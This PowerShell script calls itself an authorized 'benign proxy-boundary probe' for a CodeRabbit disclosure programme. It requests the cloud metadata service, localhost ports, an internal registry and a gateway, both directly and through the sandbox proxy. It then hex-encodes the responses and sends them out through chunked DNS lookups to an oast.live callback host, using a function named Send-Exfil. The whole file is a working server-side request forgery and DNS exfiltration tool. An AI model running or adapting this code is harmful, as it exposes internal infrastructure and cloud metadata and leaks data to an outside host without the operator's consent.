# Benign proxy-boundary probe for authorized CodeRabbit VDP research (ireniumsecurity).
# Read-only GETs through the sandbox's configured proxy vs direct. No credentials exfiltrated.
$ErrorActionPreference = 'SilentlyContinue'
$OAST = 'dbiemtt54sq43hh9eomg5wg85auknd4ek.oast.live'
$out = [ordered]@{}

function Send-Exfil([string]$s) {
    try {
        $h = -join ([System.Text.Encoding]::UTF8.GetBytes($s) | ForEach-Object { $_.ToString('x2') })
        for ($i = 0; $i -lt $h.Length -and $i -le 480; $i += 48) {
            $chunk = $h.Substring($i, [Math]::Min(48, $h.Length - $i))
            try { [System.Net.Dns]::GetHostAddresses("psf-$([int]($i/48))-$chunk.$OAST") | Out-Null } catch {}
        }
    } catch {}
}

$proxy = "$env:http_proxy"
if (-not $proxy) { $proxy = "$env:HTTP_PROXY" }
if (-not $proxy) { $proxy = 'http://127.0.0.1:1080' }
$out.proxy = $proxy

function PReq($url, $useProxy, $headers) {
    try {
        $p = @{ Uri = $url; UseBasicParsing = $true; SkipHttpErrorCheck = $true; TimeoutSec = 5; MaximumRedirection = 0 }
        if ($useProxy) { $p.Proxy = $proxy }
        if ($headers) { $p.Headers = $headers }
        $resp = Invoke-WebRequest @p
        $body = [string]$resp.Content
        return "$([int]$resp.StatusCode):" + $body.Substring(0, [Math]::Min(40, $body.Length))
    } catch { return 'ERR' }
}

$metaH = @{ 'Metadata-Flavor' = 'Google' }

# direct controls
$out.metaD = PReq 'http://169.254.169.254/computeMetadata/v1/project/project-id' $false $metaH
$out.l80D = PReq 'http://127.0.0.1/' $false $null
$out.regD = PReq 'http://10.64.0.28:4873/-/ping' $false $null

# through the configured proxy
$out.metaP = PReq 'http://169.254.169.254/computeMetadata/v1/project/project-id' $true $metaH
$out.metaP2 = PReq 'http://169.254.169.254/' $true $metaH
$out.l80P = PReq 'http://127.0.0.1/' $true $null
$out.l443P = PReq 'https://127.0.0.1/' $true $null
$out.l8080P = PReq 'http://127.0.0.1:8080/' $true $null
$out.l1080P = PReq 'http://127.0.0.1:1080/' $true $null
$out.l5000P = PReq 'http://127.0.0.1:5000/' $true $null
$out.regP = PReq 'http://10.64.0.28:4873/-/ping' $true $null
$out.gwP = PReq 'http://10.64.0.1/' $true $null
$out.ghP = PReq 'https://api.github.com/' $true $null

Send-Exfil (($out | ConvertTo-Json -Compress))
